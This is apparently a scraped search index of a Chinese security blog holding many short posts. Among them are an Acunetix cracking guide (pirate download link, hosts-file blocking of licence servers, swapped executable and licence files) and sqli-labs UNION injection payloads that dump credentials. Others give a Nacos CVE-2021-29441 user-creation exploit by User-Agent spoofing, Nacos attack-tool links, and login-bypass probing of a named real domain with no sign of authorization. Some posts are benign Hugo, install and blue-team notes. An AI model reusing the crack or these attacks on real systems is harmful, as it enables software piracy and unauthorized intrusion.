root:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20134:0:99999:7::: 然后直接修改密码即可。\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:1313/images/23.webp","permalink":"http://localhost:1313/p/%E9%9D%B6%E5%9C%BAvulnyx%E9%9D%B6%E5%9C%BA-lower2/","title":"【靶场】vulnyx靶场-Lower2"},{"content":"前言： Acunetix Premium 是一种 Web 应用程序安全解决方案，用于管理多个网站、Web 应用程序和 API 的安全。集成功能允许您自动化 DevOps 和问题管理基础架构。\n更新内容： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 改进 添加正则表达式以增强对 Django 应用程序中堆栈跟踪泄露的检测 改进了对使用弱密钥签名的 JWT 的检测 为暴露的 nginx.conf 和 .htaccess 文件添加了新的安全检查，以增强漏洞检测 添加了 LDAP 注入检测 增加了对 PII（个人身份信息）泄露漏洞的检测 JSON 响应中数据库连接字符串的新检测，以提高敏感数据暴露覆盖率 扫描仪已更新，支持从 Linux 使用 NTLM 身份验证扫描目标 更新了秘密令牌检测以增加覆盖范围 更新了 JSON 字段中的 DB 连接检测 更新了 DeepScan 以提取更多道具 添加了新的检查来检测原型污染（服务器端） 更新了 dompurify 以检测更多漏洞 更新了基于 dom 漏洞的 iframe 注入检测 更新了 XPath 注入以获得更好的覆盖范围了 修复了 Cleo Harmony/VLTrader/LexiCom RCE 检测的误报问题 修正了“Scripts\\WebApps\\drupal_3.script”中的版本比较逻辑 安全检查 为弱 ViewState 密钥添加了新的安全检查 添加了新的检查以检测 PAN-OS XSS ( CVE-2025-0133 ) 添加了一项新检查，用于检测 Citrix NetScaler 内存泄露 (CitrixBleed 2) ( CVE-2025-5777 ) 漏洞数据库（VDB）版本升级至20250708 更新了开放重定向以增加覆盖范围 为 API 添加了 JWT 身份验证绕过 添加了 SAP NetWeaver Visual Composer 无限制文件上传 ( CVE-2025-31324 ) 增加了对 Craft CMS 远程代码执行 ( CVE-2025-32432 )的检测 添加了对缺失的 X-Content-Type-Options 标头的检查 检测 Craft CMS 远程代码执行漏洞 ( CVE-2025-32432 ) 下载： 1 2 3 通过网盘分享的文件：Acunetix-v25.5.250613157.zip.apk 链接: https://pan.baidu.com/s/18gN5FnJ6KedX8ej1giI7pw 提取码: sk4s --来自百度网盘超级会员v4的分享 记得删除.apk,然后直接解压zip文件即可。\n安装： Download Zip File, password is on our post\n建议： 安装完成后， 先登录一次账号在停止服务， 执行下面操作\n在安装工具之前， 添加到 hosts 文件中 C:\\Windows\\System32\\drivers\\etc\\hosts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 127.0.0.1 erp.acunetix.com 127.0.0.1 erp.acunetix.com. ::1 erp.acunetix.com ::1 erp.acunetix.com. 127.0.0.1 discovery-service.invicti.com 127.0.0.1 discovery-service.invicti.com. ::1 discovery-service.invicti.com ::1 discovery-service.invicti.com. 127.0.0.1 cdn.pendo.io 127.0.0.1 cdn.pendo.io. ::1 cdn.pendo.io ::1 cdn.pendo.io. 127.0.0.1 bxss.me 127.0.0.1 bxss.me. ::1 bxss.me ::1 bxss.me. 127.0.0.1 jwtsigner.invicti.com 127.0.0.1 jwtsigner.invicti.com. ::1 jwtsigner.invicti.com ::1 jwtsigner.invicti.com. 127.0.0.1 sca.acunetix.com 127.0.0.1 sca.acunetix.com. ::1 sca.acunetix.com ::1 sca.acunetix.com. 192.178.49.174 telemetry.invicti.com 192.178.49.174 telemetry.invicti.com. 2607:f8b0:402a:80a::200e telemetry.invicti.com 2607:f8b0:402a:80a::200e telemetry.invicti.com. 安装后， 让我们停止它的服务调用服务工具:(使用菜单或打开任务管理器， 转到服务选项卡)\nAcunetix Acunetix Database\n管理员运行停止服务\n或者使用命令停止 1 2 net stop \u0026#34;Acunetix Supervisor\u0026#34; net stop \u0026#34;Acunetix Database\u0026#34; 替换文件 wvsc.exe\n1 C:\\Program Files (x86)\\Acunetix\\25.1.250204093 移动两个文件\nlicense_info.Json 文件和 wa_data.dat 文件到\nC:\\ProgramData\\Acunetix\\shared\\license 目录替换将 C:/ProgramData/Acunetix/shared/license/整个文件夹设置为只读\n安装完成后登录发现需要证书， 不能扫描， 先停止服务， 将 license 下文件全部删除， 复制license_info.Json 文件和 wa_data.dat 文件进去设置只读， 再次启动服务\nNow let\u0026rsquo;s restart acunetix:\n重启服务， 成功（再次启动 Acunetix 两个服务）\nAcunetix\nAcunetix Database\nNow login back to application, and you should be able to use it :)\nEnjoy（完成）\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:1313/images/20.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7acunetix_25.5.250613157-%E7%A0%B4%E8%A7%A3-%E5%AE%89%E8%A3%85/","title":"【工具】acunetix_25.5.250613157 破解-安装"},{"content":"引言： 不修改之前一定要在markdown换两行才能在博文里换行，实在是太烦了。\n修改： 其实只要在 hugo.yaml （也就是config.yaml）里面对应的选项里添加： hardWraps: true\n1 2 3 4 markup: goldmark: renderer: hardWraps: true 即可！！！\n","date":"2025-08-29T00:00:00Z","image":"http://localhost:1313/images/18.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%8F%96%E6%B6%88-markdown-%E4%B8%A5%E6%A0%BC%E6%8D%A2%E8%A1%8C/","title":"【Hugo】hugo-stack主题魔改-取消 markdown 严格换行"},{"content":"Less-1 验证注入点：单引号报错，两个单引号闭合利用闭合方式：' \u0026lt;payload\u0026gt; --+\n1.进入第一题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n1 http://localhost/sqli-labs/Less-1/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; 4.构造?id=1' and '1'='1页面重新显示正常，由此判断出这题是单引号字符型注入\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;1 5.构造?id=1' order by 1 --+通过order by子句来判断该数据表的字段数，页面显示正常。\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; order by 1 --+ 构造?id=1' order by 4 --+页面显示错误信息，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; order by 4 --+ 6.构造?id=-1' union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,3 --+ 7.构造?id=-1' union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,database() --+ 8.构造\n1 ?id=-1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n9.构造\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n10.构造\n1 ?id=-1\u0026#39; union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-2 验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：\u0026lt;payload\u0026gt;\n与第一关基本一样，就 id 不用闭合\n1.进入第二题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n1 http://localhost/sqli-labs/Less-2/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知是单引号影响了SQL语句的闭合，由此判断出这题是数字型注入\n1 http://localhost/sqli-labs/Less-2/?id=1\u0026#39; 4.构造?id=1 order by 3 --+通过order by子句来判断该数据表的字段数\n1 http://localhost/sqli-labs/Less-2/?id=1 order by 3 --+ ![[Pasted image 20250313162025.png]]\n构造?id=1 order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-2/?id=1 order by 4 --+ ![[Pasted image 20250313162128.png]]\n5.构造?id=-1 union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-2/?id=1 union select 1,2,3 --+ 6.构造?id=-1 union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,database() --+ 7.构造\n1 http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n9.构造\n1 ?id=-1 union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-3 验证注入点：单引号报错，两个单引号闭合利用闭合方式：') \u0026lt;payload\u0026gt; --+\n也是闭合符号不一样\n1.进入第三题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常。\n1 http://localhost/sqli-labs/Less-3/?id=1 ![[Pasted image 20250313163018.png]]\n3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号和括号包裹\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39; 4.构造?id=1') order by 3 --+通过order by子句来判断该数据表的字段数\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39;) order by 3 --+ ![[Pasted image 20250313163156.png]]\n构造?id=1') order by 4 --+页面报错，由此可知该表字段数为3\n5.构造?id=-1') union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39;) union select 1,2,3 --+ ![[Pasted image 20250313163335.png]]\n6.构造?id=-1') union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-3/?id=-1\u0026#39;) union select 1,2,database() --+ 7.构造\n1 http://localhost/sqli-labs/Less-3/?id=-1\u0026#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1\u0026#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n![[Pasted image 20250313165309.png]]\n9.构造\n1 ?id=-1\u0026#39;) union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-4 验证注入点：双引号报错，两个双引号闭合利用闭合方式：\u0026quot;) \u0026lt;payload\u0026gt; --+\n也是闭合符号不一样\n1.进入第四题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n3.接下来加个双引号，显示语句出错，根据报错信息可以得知参数id的值被双引号和括号包裹\n4.构造?id=1\u0026quot;) order by 3 --+通过order by子句来判断该数据表的字段数,页面显示正常\n构造?id=1\u0026quot;) order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-4/?id=1\u0026#34;) order by 3 --+ 5.构造?id=-1\u0026quot;) union select 1,2,3 --+判断出回显点为该表的第二、三字段\n6.构造?id=-1\u0026quot;) union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-4/?id=-1\u0026#34;) union select 1,2,database() --+ ![[Pasted image 20250313170055.png]]\n7.构造\n1 ?id=-1\u0026#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1\u0026#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n9.构造\n1 ?id=-1\u0026#34;) union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-5 验证注入点：单引号报错，两个单引号闭合利用闭合方式：' \u0026lt;payload\u0026gt; --+\n考察点：报错注入\n1.进入第五题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示You are in...........，不再像前4题显示name和passwd\n1 http://localhost/sqli-labs/Less-5/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; 4.构造?id=1‘ order by 1 --+通过order by子句来判断该数据表的字段数，页面显示正常\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; order by 1 --+ 构造?id=1' order by 3 --+页面显示正常\n构造?id=1' order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; order by 3 --+ 5.构造?id=-1' union select 1,2,3 --+判断回显点，结果发现行不通\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; union select 1,2,3 --+ 6.构造?id=1' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+发现可以进行盲注\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+ 7.也可以使用length()来判断数据库名的长度\n1 http://192.168.58.128/sqli-labs/Less-5/?id=1\u0026#39;and length((select database()))\u0026gt;7 --+ ","date":"2025-08-29T00:00:00Z","image":"http://localhost:1313/images/19.webp","permalink":"http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less1-5/","title":"【靶场】sql-labs-Less1-5"},{"content":"效果 修改 高度限制在 20em，并隐藏滚动条。\n增添到 ==/themes/hugo-theme-stack/assets/scss/partials/article.scss==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .article-content { .highlight { padding: var(--card-padding); pre { margin: initial; padding: var(--card-padding); margin: 0; width: auto; max-height: 20em; scrollbar-width: none; /* Firefox */ \u0026amp;::-webkit-scrollbar { display: none; /* Chrome Safari */ } } } } 修改完成！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/17.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%9B%BA%E5%AE%9A%E4%BB%A3%E7%A0%81%E5%9D%97%E9%AB%98%E5%BA%A6/","title":"【Hugo】hugo-stack主题魔改-固定代码块高度"},{"content":"最终效果： 自定义修改 修改位置：\\content\\categories\\标签名\\_index.md\nindex.md文件内容：\n1 2 3 4 5 6 7 8 9 --- title: \u0026#34;Web攻防\u0026#34; description: \u0026#34;介绍\u0026#34; slug: \u0026#34;Web攻防\u0026#34; image: \u0026#34;Web攻防.webp\u0026#34; style: background: \u0026#34;#2a9d8f\u0026#34; color: \u0026#34;#fff\u0026#34; --- 修改：\n1 2 3 style: background: \u0026#34;#2a9d8f\u0026#34; color: \u0026#34;#fff\u0026#34; 颜色如下，根据自己喜欢的颜色进行修改：\n风格定位 背景色（Background） 文字色（Color） 色值说明 清新自然 #264653 #ffffff 深青绿色背景 + 纯白文字，低饱和更显柔和 温柔治愈 #e76f51 #ffffff 暖橙色背景 + 纯白文字，适合温馨场景 高级极简 #1d3557 #f1faee 藏蓝色背景 + 米白文字，避免纯白刺眼 活力明亮 #ffb703 #212121 亮黄色背景 + 深灰文字，对比强烈不刺眼 复古优雅 #8b5a2b #f5f5f5 棕褐色背景 + 米白文字，自带复古质感 冷静专业 #3a86ff #ffffff 天蓝色背景 + 纯白文字，适合商务场景 森系柔和 #43aa8b #f9fafb 浅草绿背景 + 近白文字，自然不突兀 神秘高级 #2b2d42 #edf2f4 深灰蓝背景 + 浅灰文字，低调有质感 甜美清新 #ff6b6b #ffffff 浅粉色背景 + 纯白文字，适合女性向场景 沉稳大气 #0077b6 #ffffff 深海蓝背景 + 纯白文字，显专业且庄重 只需要修改：background和color就可以了。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/11.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%BD%92%E6%A1%A3%E6%A0%87%E7%AD%BE%E9%A2%9C%E8%89%B2%E8%87%AA%E5%AE%9A%E4%B9%89/","title":"【Hugo】hugo-stack主题魔改-归档标签颜色自定义"},{"content":"1. 漏洞概述 2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括创建新⽤户并进⾏登录后操作。\n2. 影响版本 Nacos \u0026lt;= 2.0.0-ALPHA.1\n3. 环境搭建 Nacos下载地址(github):\n1 https: github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 Windows搭建：\n进入github下载地址后下载版本： 1 nacos-server-2.0.0-ALPHA.1.zip 解压出来后进入bin目录： 1 D:\\TargetDrone\\nacos-server-2.0.0-ALPHA.1\\nacos-server-2.0.0-ALPHA.1\\nacos\\bin 输入在当前文件夹下使用打开cmd窗口，输入命令： 1 .\\startup.cmd -m standalone 然后访问网站： 1 2 http://192.168.31.134:8848/nacos/ 192.168.31.134：自己的内网IP地址 5. 默认账号密码\n1 nacos/nacos 即可。\n4. 漏洞复现 漏洞路径 1 http: your-ip:8848/nacos/v1/auth/users?pageNo=1\u0026amp;pageSize=1 2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问\n1 http: your-ip:8848/nacos/v1/auth/users PSOT传参：\n1 username=test1\u0026amp;password=test1 UA 头：\n1 Nacos-Server 发送POST请求，返回码200，创建⽤户成功~！\n返回Nacos登录界面：\n使用账号/密码：\n1 test1/test1 关闭环境：\n1 ./shutdown.sh 5. 漏洞分析 Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。\n正因为这样，所以当我们UA恶意改为Nacos-Server的时候，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。\n这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析\n关键代码在该⽂件下:\n1 2 /nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficRevise Filter.java TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。\n就是很简单的⼀个对于UA的⼀个判断逻辑\n这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。\n6. 漏洞修复 若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/15.webp","permalink":"http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","title":"【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞"},{"content":"0x00 前置知识 1. 平台语法 1 2 3 4 5 hunter语法： app.name=\u0026#34;Nacos\u0026#34; fofa语法： title=\u0026#34;nacos\u0026#34; app=\u0026#34;nacos\u0026#34; 端口：port=\u0026ldquo;8848\u0026rdquo;\n2. 信息收集 资产少的情况下：\n如果没有明显特征，那就通过被动扫描器，如：burp的插件TsojanScan，HAE，logger++等\n1 https://github.com/Tsojan/TsojanScan 资产多的情况下：\n那我们就直接使用指纹识别工具EHole_magic\n1 https://comm.pgpsec.cn/54.html 可以特定⼀些⽬录如nacos、/webroot/decision/login等等，进⾏更加精确的扫描进⾏精准的识别。（但网站收费）\n批量漏洞检测工具：\nNacosExploit\n1 https://github.com/h0ny/NacosExploit 漏洞检测：\n3. 漏洞利用点 Nacos 默认帐户名密码：\n1 nacos/nacos 0x01 工具 反序列化漏洞利⽤⼯具\n1 https://github.com/c0olw/NacosRce/releases/tag/v0.5 哥斯拉nacos后渗透插件\n1 https://github.com/pap1rman/postnacos 综合利⽤,且gui版本\n1 https://github.com/charonlight/NacosExploitGUI ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/10.webp","permalink":"http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/","title":"【Nacos】Nacos红队打点方法"},{"content":"开局 首先先拿到一个站点：\n1 2 3 4 5 whjwcm.cn 通过fofa，鹰图等等找资产： domain=\u0026#34;whjwcm.cn\u0026#34; 找到一个图文盒子后台登录页面： https://wss.whjwcm.cn 这时候发现#号：\n1 2 https://wss.whjwcm.cn/manage/#/login?redirect=%2Fplat #/login?redirect=%2Fplat 思路一 0x01 进入后台首先尝试弱口令 一般就是最简单的admin\n0x02 看数据包 修改error为0 通过抓包可以看到返回信息：\n1 2 3 4 5 6 { \u0026#34;error\u0026#34;:1, \u0026#34;msg\u0026#34;:\u0026#34;\\u7528\\u6237\\u540d\\u6216\\u5bc6\\u7801\\u4e0d\\u6b63\\u786e\u0026#34;, \u0026#34;data\u0026#34;:\u0026#34;\u0026#34; } 一共三个参数，都可以试一下： 接触该请求，拦截一下相应信息对error进行修改。\n这里可以看到：error和data数据都可以进行修改，然后进行测试。\n发现进入了/admin/user/info，但Cookie认证是一个未知的，这里可以看出已经没什么用了。\n修改error为200 这里可以将error修改为200，试一下是否可以绕过。\n发现还是不行，这里思路也没了。\ndata进行测试 尝试再data参数中添加一下值，看一下是否可以绕过，\n发现还是不行:\n这时候就可以看一下js文件了，是否有关于这两个参数的代码逻辑问题。\njs文件查找参数 这里看出从js文件中找到了一个data对应的参数值，也是可以进行尝试的。\n但经过测试还是不行，但也是一个思路，后续遇到了可以进行尝试。\n丢弃req数据包 通过劫持req的数据包，丢弃掉，有的时候也可以卡进去，但是这里发现，并不行，这时候这种思路也不行了。\n总结 1 这时候再尝试逻辑漏洞就不现实了，现在这种带#的这种漏洞就不多了。 思路二 如果遇到Cookie:admin-token=未知\n如果遇到一个后台登录页面，抓包发现一个error返回参数为1，然后修改参数0，进行尝试发送后，遇到返回数据中有Cookie:admin-token=未知后，我们的思路是：\n找小程序的token/Cookie，抓取过去进行尝试 找其他系统的弱口令进行尝试修改。 ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/12.webp","permalink":"http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/","title":"【Web攻防】常见Web攻防登录框打法-01"},{"content":"1. 下载地址： 1 https://github.com/shmilylty/OneForAll 2. 使用： 首先把requirements.txt下载下来。\n1 pip install -r .\\requirements.txt 然后直接使用即可\n1 python.exe .\\oneforall.py --target xiyoupark.com run 结果会导出到results文件夹下。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/4.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7oneforall%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"【工具】OneForAll子域名收集工具的使用"},{"content":"部署安装网址： 1 https://blog.csdn.net/weixin_45950429/article/details/107069404 下载地址： 1 2 3 通过网盘分享的文件：WindowsServer 2003.iso 链接: https://pan.baidu.com/s/1_VmXyNxI5kyouSAMjMl5wQ 提取码: 1234 --来自百度网盘超级会员v2的分享 步骤一： 打开VMware,点击我的主页，点击创建新的虚拟机：\n这里选择稍后安装操作系统，然后点击“下一步”\n客户机操作系统选择“Microsoft Windows(W)\u0026quot;，版本的话，你下载的是什么版本你就安装什么版本，我最前面发的是Windows Server 2003 Standard Edition版本的额，也就是32位的。然后点击”下一步”\n虚拟机名称，我这里就默认了，位置一定要自己选择，把它放在内存空间充足的磁盘。\n这里你可以默认40GB，我避免要做的东西多，所以设了“60GB”，下面选择“将虚拟磁盘拆分成多个文件（M），然后点击下一步\n点击自定义硬件，里面的打印机极少用，可以选择移除，然后点击CD，浏览放入映像文件\n点击关闭之后会自动回到这页，点击“完成”\n完成之后就会生成一个虚拟机\n步骤二： 放入镜像之后的安装过程\n点击“开启此虚拟机\u0026quot;,随后就会进入这个页面，开始等待\n点击\u0026quot;Enter\u0026quot;键进行安装，再等待\n点击选择”用NTFS文件系统格式化磁盘分区（快），随后点击\u0026quot;Enter\u0026quot;键继续\n安装格式化，等待\n等待\n出现这个画面，点击“下一步”\n点击我接受这个协议，点击“下一步”\n继续等待，出现这个画面，点击“下一步”，自定义输入名称，点击“下一步”\n这里服务器修改为“500”，然后点击“下一步”\n一定记得设置自己记得住的密码，等一下安装好后开机需要使用\n默认点击下一步，等待\n出现这个画面，点击“典型设置”，点击“下一步”\n选择“不，此计算机不在网络上，或者再没有域的网络上，把此计算机作为下面工作组的一个成员（W)\u0026quot;, 点击”下一步“\n步骤三： 出现这个画面时，点击\u0026quot;完成”，随后点击“是”\n“x\u0026quot;掉\n在 开始–我的电脑–属性-自动更新–点击关闭自动更新(T)\n完成 你可以在桌面点击右键–属性–设置–修改分辨率即可修改屏幕大小\n结束完成！！！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/5.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7windows-server-2003%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/","title":"【工具】windows server 2003安装部署"},{"content":"0x01 查看端口状态 命令:\n1 netstat -ano 连接状态有一下几种\nLISTENING：表示监听 ，表示这个端口处于开放状态， 可以提供服务 ESTABLISHED\u0026quot;：表示是对方与你已经连接 正在通信交换数据 CLOSING：表示关闭的 表示端口人为或者防火墙使其关闭(也许服务被卸载) TIME WAIT ：表示正在等待连接 就是你正在向该端口发送请求连接状态\n通过netstat查看网络连接，每条连接后面都有一个PID号，根据PID号可以定位出是哪个进程在监听这个端口 直接查看程序与外部地址的已建立的连接情况 命令:\n1 netstat -b 显示在创建每个连接或侦听端口时涉及的可执行程序，需要管理员权限，这条程序对于查找可疑程序非常有帮助\n或者我们先通过查看网络连接状态，查看pid再通过PID定位程序\n查看已建立的连接 通过如下命令我们优先查找已建立的连接，看是否存在可疑的连接\n1 netstat -ano|findstr \u0026#34;ES\u0026#34; 如下，我们发现一条可疑tcp连接，本机与一个外部的地址的一个特殊端口已经建立了连接，pid号为5840。（我们要着重观察本地是否与外部地址的特殊端口进行连接）\n0x02 根据PID定位进程 命令:\n1 tasklist tasklist ：显示运行在本地或远程计算机上的所有进程。如下图显示了进程对应的PID号\nPID定位进程 上面我们发现了一个可疑的TCP连接，pid号为5840，现在通过这pid定位程序\n1 tasklist | findstr \u0026#34;5840\u0026#34; 如下可知，5840对一个的程序为payload2.exe\n获取进程的全路径 命令:\n1 wmic process | findstr \u0026#34;payload2.exe\u0026#34; 如下，显示了程序的全路径\n或者通过任务管理器找到该进程，再打开进程所在路径\n杀死进程 1 taskkill /f /pid pid号 # /f为强制的意思 注：以上可疑程序的payload为MSF的payload。CS的payload通过上述方式并不能查看到，可知CS的payload隐蔽性还是很高的。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/6.webp","permalink":"http://localhost:1313/p/%E8%93%9D%E9%98%9Fwindows-%E7%AB%AF%E5%8F%A3%E6%8E%92%E6%9F%A5%E6%A1%88%E4%BE%8B/","title":"【蓝队】windows 端口排查案例"},{"content":"0x00 前置 当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：\n我是谁？\u0026ndash;主机身份与特权边界确认。\n这是哪？\u0026ndash;对目前机器处网络环境的拓扑结构进行分析和判断。\n我在哪？\u0026ndash;对目前机器所处伪造区域的判断。\n谁在哪？\u0026ndash;对比钱机器反防御技术识别网络中的安全监控节点。\n0x01 要收集的信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 操作系统 当权用户权限 内网IP段（网卡信息） 杀毒软件（AV） 端口开放情况 系统补丁 网络状态 共享文件夹 远程信息 服务信息 软件列表 计划任务 启动项 系统日志 防火墙规则 网络代理信息 内网OA办公系统 邮件服务器 网络监控系统 财务应用系统 核心产品源码（SVN/Git 服务器） 管理员密码 浏览器密码 cookie 无线密码 数据库密码 VPN历史密码 Teamview 历史密码 其他用户 session 3389 连接记录 IPC$ 连接记录 各用户回收站信息 用户列表 host 文件 DNS 缓存信息 补丁信息 端口信息 账户密码策略 账号锁定策略 Web 服务器配置文件 Web 服务器日志 ...... 0x02 Windows信息收集 1. 主机信息收集 查看当前用户以及当前用户所在组，所拥有的权限。\n1 shell whoami /all 2. 网卡和IP信息收集 查看网卡等基本网络配置信息，主要留意Ethernet0以及Ethernet1，这个网卡，记录了可以通的网段信息\n1 shell ipconfig /all 可以看出当前是两个网卡，并且主DNS是一个域名（这里环境有问题，一般看DNS是一个域名，既是域环境。），一般来说只有域机器才会有域名显示，而在工作组下显示的是空：\n3. 查看系统详情信息 可以查看网卡，系统，补丁信息\n1 shell systeminfo 我们可以通过该命令获得了系统的信息，就可以直接使用下面网站获取exp。\n1 http://bypass.tidesec.com/exp/ 